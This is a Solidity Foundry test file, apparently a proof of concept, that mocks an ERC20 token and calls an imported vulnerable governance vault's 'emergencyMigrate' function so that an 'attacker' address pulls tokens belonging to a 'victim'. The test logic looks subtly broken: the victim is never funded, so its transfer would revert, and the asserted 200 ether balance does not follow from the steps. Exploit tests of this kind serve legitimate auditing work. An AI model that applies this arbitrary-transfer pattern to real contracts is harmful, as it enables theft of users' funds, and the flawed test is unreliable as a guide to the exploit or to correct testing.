pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/test2.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(uint256 initialSupply) {
        balanceOf[msg.sender] = initialSupply;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

contract PoC is Test {
    VulnerableGovernanceVault public vault;
    MockERC20 public token;

    function setUp() public {
        token = new MockERC20(1000 ether);
        vault = new VulnerableGovernanceVault(address(token));
        vm.prank(address(vault));
        token.approve(address(vault), type(uint256).max);
    }

    function testArbitrarySendERC20() public {
        address attacker = address(0x1234);
        address victim = address(0x5678);
        uint256 amount = 100 ether;

        vm.prank(victim);
        token.transfer(attacker, amount);

        vm.prank(attacker);
        token.approve(address(vault), amount);

        vm.prank(attacker);
        vault.emergencyMigrate(victim, attacker, amount);

        assertEq(token.balanceOf(attacker), 200 ether);
    }
}